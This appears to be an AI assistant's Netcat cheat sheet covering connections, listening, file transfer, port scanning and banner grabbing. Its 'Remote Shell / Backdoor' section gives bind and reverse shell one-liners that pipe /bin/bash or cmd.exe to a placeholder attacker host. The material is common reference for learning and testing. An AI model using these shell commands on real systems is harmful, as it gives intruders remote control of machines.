Of course. Here is the Netcat cheat sheet in a clean, professional Markdown format.

# Netcat (nc) Cheat Sheet

## Overview
Netcat is the "Swiss Army knife" of networking, used for reading from and writing to network connections using TCP or UDP.

---

## Core Syntax & Modes

### Basic Command Structure
```bash
nc [OPTIONS] HOST PORT
```

### 1. Connect Mode (Client)
Initiate a connection to a remote host.

```bash
# Basic TCP connection
nc example.com 80

# Basic UDP connection
nc -u example.com 53

# Connect with verbose output
nc -v example.com 443

# Connect with a specific source port
nc -p 31337 example.com 80
```

### 2. Listen Mode (Server)
Listen for incoming connections.

```bash
# Listen on a TCP port
nc -l -p 4444

# Listen on a UDP port
nc -u -l -p 4444

# Listen verbosely and keep accepting new connections
nc -lvk -p 4444

# Listen on a specific interface IP
nc -l -p 4444 -s 192.168.1.100
```

---

## Essential Options

| Option | Description                                                                 |
| :----- | :-------------------------------------------------------------------------- |
| `-l`   | Listen mode (act as a server)                                               |
| `-p`   | Specify local port number                                                   |
| `-u`   | Use UDP mode (default is TCP)                                               |
| `-v`   | Verbose output (`-vv` for more verbosity)                                   |
| `-n`   | Do not resolve DNS names (use only IP addresses)                            |
| `-z`   | Zero-I/O mode (used for port scanning, doesn't send data)                   |
| `-w`   | Set a connection timeout in seconds (e.g., `-w 5`)                          |
| `-k`   | Keep listening after a client disconnects (accept multiple connections)     |
| `-s`   | Specify the source IP address to use                                        |
| `-e`   | Execute a program after connecting (e.g., `-e /bin/bash` for a shell)       |

---

## Practical Use Cases

### Port Scanning
```bash
# Scan a single port
nc -zv target.com 22

# Scan a range of ports
nc -zv target.com 20-25

# Scan specific ports
nc -zv target.com 80 443 8080

# UDP port scan
nc -zuv target.com 53

# Fast scan with a short timeout
nc -zv -w 1 target.com 1-100
```

### File Transfers
```bash
# RECEIVER (waits for file)
nc -l -p 4444 > received_file.txt

# SENDER (sends file)
nc -w 3 receiver-ip 4444 < file_to_send.txt

# Transfer a whole directory (using tar)
# Receiver: nc -l -p 4444 | tar xzvf -
# Sender: tar czvf - /path/to/dir/ | nc receiver-ip 4444
```

### Remote Shell / Backdoor
```bash
# BIND SHELL (Victim listens, attacker connects)
# On Victim: nc -lv -p 4444 -e /bin/bash
# On Attacker: nc victim-ip 4444

# REVERSE SHELL (Victim connects to attacker)
# On Attacker: nc -lv -p 4444
# On Victim: nc attacker-ip 4444 -e /bin/bash

# Windows Reverse Shell
# On Attacker: nc -lv -p 4444
# On Windows Victim: nc.exe attacker-ip 4444 -e cmd.exe
```

### Network Debugging & Interaction
```bash
# Manual HTTP Request
nc example.com 80
GET / HTTP/1.1
Host: example.com
[Enter twice]

# Test SMTP Server
nc -v mail.server.com 25
HELO test.com

# Simple Chat Session
# User 1: nc -l -p 4444
# User 2: nc user1-ip 4444
```

### Banner Grabbing
```bash
# Grab SSH Banner
echo "" | nc -v -w 2 target.com 22

# Grab SMTP Banner
echo "QUIT" | nc -v -w 2 target.com 25

# Grab HTTP Banner
printf "GET / HTTP/1.0\r\n\r\n" | nc -v target.com 80
```

---

## Important Notes & Security

*   **The `-e` flag is often removed from modern Netcat versions for security reasons.** You may need to use other techniques or a different version of Netcat for reverse shells.
*   **Netcat traffic is unencrypted.** Never use it for sensitive data on untrusted networks. Use `openssl s_client`/`s_server` or SSH tunnels for encryption.
*   **Consider modern alternatives** like `ncat` (from Nmap, which supports SSL) or `socat` for more advanced features and reliability.

---

## Quick Command Reference

| Task | Command |
| :--- | :--- |
| **Quick Listen** | `nc -lvp 4444` |
| **Quick Connect** | `nc target.com 80` |
| **Quick Port Check** | `nc -zv target.com 443` |
| **Send a File** | `nc -w 3 host 4444 < file.txt` |
| **Receive a File** | `nc -l -p 4444 > file.txt` |